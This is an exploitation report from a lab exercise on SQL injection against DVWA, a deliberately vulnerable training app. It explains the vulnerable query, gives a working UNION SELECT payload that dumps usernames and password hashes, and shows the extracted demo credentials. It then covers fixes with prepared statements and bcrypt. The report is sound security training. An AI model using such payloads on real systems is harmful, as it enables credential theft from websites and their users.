# Exploitation Report — SQL Injection (DVWA Security Level: High)

---

## Part I — Context and Environment

| Parameter | Value |
|---|---|
| Target | `192.168.250.87` |
| Module | SQL Injection |
| Security Level | High |
| Database | MySQL |
| Backend Language | PHP |

---

## Part II — Vulnerable Source Code Analysis

The source code retrieved via the **"View Source"** button in DVWA reveals the following SQL query:

```php
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
```

> **WARNING**
> The `$id` variable is concatenated directly into the query with no validation, escaping, or prepared statement. The `LIMIT 1` clause provides no security — it only restricts the display of the first legitimate query result and has no effect on a `UNION`-based injection.

The distinction between the **High** and **Low** security levels in DVWA lies in the input mechanism: the user ID is submitted through a **separate session page** (`session-input.php`), intended to hinder automated tooling. This does not constitute a defense against manual injection.

---

## Part III — Exploitation Methodology

### A - Vulnerability Identification

Direct inspection of the source code confirmed that user input was inserted into the SQL query without any sanitization. No blind reconnaissance phase (trial-and-error via `ORDER BY` or `UNION SELECT null`) was required, as the number of returned columns (2: `first_name` and `last_name`) was directly readable in the source.

### B - Payload Construction

The payload used is the following:

```
1' UNION SELECT user, password FROM users#
```

Token-by-token breakdown:

| Token | Role |
|---|---|
| `1'` | Closes the legitimate `$id` value and breaks the expected SQL syntax |
| `UNION SELECT` | Appends a second query whose results are merged with the first |
| `user, password` | Selects the two columns matching the original query's output structure |
| `FROM users` | Targets the table containing user credentials |
| `#` | MySQL comment character — neutralizes the remainder of the original query, including `LIMIT 1` |

### C - Query Actually Executed by MySQL

After injection, the query interpreted by the server is:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1'
UNION
SELECT user, password FROM users#' LIMIT 1;
```

The `UNION` operator merges the result of both `SELECT` statements, returning **all records** from the `users` table.

---

## Part IV — Results

The output displayed in the DVWA interface is as follows:

| Username | MD5 Hash | Plaintext Password |
|---|---|---|
| admin | `5f4dcc3b5aa765d61d8327deb882cf99` | `password` |
| gordonb | `e99a18c428cb38d5f260853678922e03` | `abc123` |
| 1337 | `8d3533d75ae2c3966d7e0d4fcc69216b` | `charley` |
| pablo | `0d107d09f5bbe40cade3de5c71e9e9b7` | `letmein` |
| smithy | `5f4dcc3b5aa765d61d8327deb882cf99` | `password` |

> **NOTE**
> The first returned block corresponds to the legitimate result of the original query for `user_id = 1`. All subsequent blocks are the product of the `UNION` injection.

> **WARNING**
> MD5 hashes were reversed using publicly available rainbow tables. MD5 is not suitable for password storage: it is fast, unsalted by default, and fully indexed by databases such as **CrackStation**. **NIST SP 800-63b** exclusively recommends adaptive hashing functions such as **bcrypt**, **scrypt**, or **Argon2**.

---

## Part V — Remediation

### A - Prepared Statements (Primary Fix)

The fundamental fix is to use **prepared statements** with bound parameters, making SQL injection syntactically impossible:

```php
$stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->execute([$id]);
```

### B - Password Hashing

Replace MD5 with a purpose-built password hashing function:

```php
// Storage
$hash = password_hash($plaintext, PASSWORD_BCRYPT);

// Verification
password_verify($plaintext, $hash);
```

### C - Principle of Least Privilege

The MySQL account used by the application should hold only the `SELECT` privilege on strictly necessary tables. Granting read access to the `users` table from the web frontend already constitutes an architectural risk that should be mitigated through role separation.

---

## Part VI — References

| Source | Reference |
|---|---|
| OWASP Top 10 | A03:2021 – Injection |
| MITRE ATT&CK | T1190 – Exploit Public-Facing Application |
| NIST | SP 800-63b – Digital Identity Guidelines |
| NIST | SP 800-53 – Security and Privacy Controls |
| OWASP | SQL Injection Prevention Cheat Sheet |

> **Abstract**
> This exploitation demonstrates the **A03:2021 – Injection** category from the OWASP Top 10, as well as the **T1190 – Exploit Public-Facing Application** technique from the MITRE ATT&CK framework. The separate input page mechanism specific to DVWA's High security level is a form of **security through obscurity**, which does not constitute a real defense according to **NIST SP 800-53** principles.
